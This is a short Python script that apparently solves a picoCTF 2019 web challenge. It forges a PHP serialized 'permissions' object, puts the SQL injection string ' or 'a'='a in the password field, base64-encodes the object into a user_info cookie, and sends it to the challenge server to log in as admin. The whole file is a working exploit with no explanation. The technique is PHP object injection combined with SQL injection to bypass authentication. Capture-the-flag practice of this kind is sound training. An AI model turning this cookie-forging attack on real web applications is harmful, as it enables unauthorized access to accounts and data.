import base64
import requests


inject = "' or 'a'='a"
php_serialize = 'O:11:"permissions":2:{s:8:"username";s:6:"admin ";s:8:"password";s:11:"' + inject+ '";}"'

print(php_serialize)

user_info = base64.b64encode(php_serialize.encode()).decode()
print(user_info)


url = "https://2019shell1.picoctf.com/problem/37889/index.php"
params = {"file": "admin"}
headers = {'Cookie': "user_info=" + user_info}
response = requests.get(url, params=params, headers=headers)

print(response.text)
